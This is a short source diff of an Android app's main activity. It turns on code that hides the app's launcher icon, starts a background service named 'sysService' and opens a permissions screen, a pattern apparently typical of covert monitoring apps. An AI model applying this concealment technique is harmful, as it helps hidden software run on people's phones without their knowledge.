@@ -19,18 +19,17 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         //setContentView(R.layout.activity_main);
         startService(new Intent(getBaseContext(), sysService.class));
-        Toast.makeText(getApplicationContext(), "from main acti", Toast.LENGTH_LONG).show();
         // hide icon
         PackageManager p = getPackageManager();
         ComponentName componentName = new ComponentName(this, MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
-        //p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
 
         // mediaPro
-/*
-        Intent mainIntent = new Intent(this, permissionActivity.class);
+
+        Intent mainIntent = new Intent(this, PermissionActivity.class);
         mainIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         startActivity(mainIntent);
-        */
+
         this.finish();
     }
 } // end class
